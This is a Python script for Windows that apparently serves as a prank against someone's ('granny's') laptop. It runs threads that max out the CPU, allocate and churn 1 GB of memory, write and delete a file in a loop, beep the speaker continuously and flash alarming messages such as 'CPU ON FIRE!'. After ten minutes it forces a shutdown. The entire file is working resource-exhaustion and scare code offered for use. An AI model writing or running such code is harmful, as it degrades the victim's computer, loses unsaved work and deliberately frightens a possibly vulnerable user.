import threading
import time
import os
import random
import winsound
import tkinter as tk

def cpu_stress():
    while True:
        pass
def ram_stress():
    data = bytearray(1024*1024*1024)
    while True:
        data[random.randint(0, len(data)-1)] = random.randint(0,255)
def disk_stress():
    while True:
        with open("granny_test.txt", "w") as f:
            f.write("a"*1024*1024)
        os.remove("granny_test.txt")
def speaker_beeps():
    while True:
        winsound.Beep(2500, 1000)
def crazy_screen():
    root = tk.Tk()
    label = tk.Label(root, text="", font=('Helvetica', 48))
    label.pack()
    while True:
        label.config(text=random.choice(["GRANNY'S LAPTOP IS MELTING!", "CPU ON FIRE!", "RAM OVERLOAD!"]))
        root.update()
        time.sleep(0.1)
def self_destruct():
    time.sleep(600)  # 10 minutes
    os.system("shutdown /s /t 1")  # Windows shutdown command
threads = [
    threading.Thread(target=cpu_stress),
    threading.Thread(target=ram_stress),
    threading.Thread(target=disk_stress),
    threading.Thread(target=speaker_beeps),
    threading.Thread(target=crazy_screen),
    threading.Thread(target=self_destruct)
]
for thread in threads:
    thread.start()
